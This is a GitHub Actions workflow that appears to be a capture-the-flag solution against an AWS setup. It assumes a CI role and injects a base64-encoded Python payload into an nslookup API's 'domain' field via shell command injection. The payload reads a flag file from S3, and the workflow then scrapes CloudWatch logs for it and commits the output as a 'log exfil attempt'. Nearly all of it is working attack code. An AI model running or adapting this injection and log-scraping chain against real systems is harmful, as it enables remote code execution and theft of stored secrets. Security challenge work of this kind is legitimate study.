name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Inject print(flag.hex()) to CloudWatch, then read CW logs
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          echo "=== Step 1: Inject flag print into Lambda stdout (-> CloudWatch) ==="
          # Python: read flag, print hex to stdout so Lambda captures it in CloudWatch logs
          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();print('FLAG_HEX:'+flag.hex());print('FLAG_B64:'+__import__('base64').b64encode(flag).decode());print('FLAG_LEN:'+str(len(flag)))"
          B64=$(echo -n "$PY" | base64 -w0)
          curl -v -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}" 2>&1
          echo ""
          echo "=== Lambda response captured above ==="

          echo "=== Step 2: List Lambda CloudWatch log groups ==="
          aws logs describe-log-groups --region us-east-1 2>&1 | head -100

          echo "=== Step 3: Try to find Lambda function log group ==="
          for prefix in "/aws/lambda" "/aws/lambda/nslookup" "/aws/lambda/codec" "/aws/lambda/dev"; do
            echo "--- Trying prefix: $prefix ---"
            aws logs describe-log-groups --log-group-name-prefix "$prefix" --region us-east-1 2>&1
          done

          echo "=== Step 4: Check Lambda response body for flag ==="
          RESPONSE=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}")
          echo "Response: $RESPONSE"

      - name: Try to read CW logs if accessible
        run: |
          echo "=== CloudWatch log group search ==="
          aws logs describe-log-groups --region us-east-1 2>&1 > cw_groups.txt
          cat cw_groups.txt

          echo "=== Try direct Lambda function name guesses ==="
          for fname in nslookup codec-nslookup codec dev-nslookup lambda-nslookup dns-lookup; do
            GROUP="/aws/lambda/$fname"
            echo "--- Checking $GROUP ---"
            STREAMS=$(aws logs describe-log-streams \
              --log-group-name "$GROUP" \
              --order-by LastEventTime \
              --descending \
              --max-items 3 \
              --region us-east-1 2>&1)
            echo "$STREAMS"
            if echo "$STREAMS" | grep -q "logStreamName"; then
              STREAM=$(echo "$STREAMS" | python3 -c "import sys,json; data=json.load(sys.stdin); print(data['logStreams'][0]['logStreamName'])" 2>/dev/null)
              echo "Reading stream: $STREAM"
              aws logs get-log-events \
                --log-group-name "$GROUP" \
                --log-stream-name "$STREAM" \
                --limit 50 \
                --region us-east-1 2>&1 | grep -i "flag\|FLAG\|hex\|b64" || true
            fi
          done

          echo "=== Also check API GW logs ==="
          aws logs describe-log-groups --log-group-name-prefix "API-Gateway" --region us-east-1 2>&1 | head -50

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add cw_groups.txt 2>/dev/null || true
          git commit -m "cloudwatch log exfil attempt" || echo "Nothing to commit"
          git push origin corgi
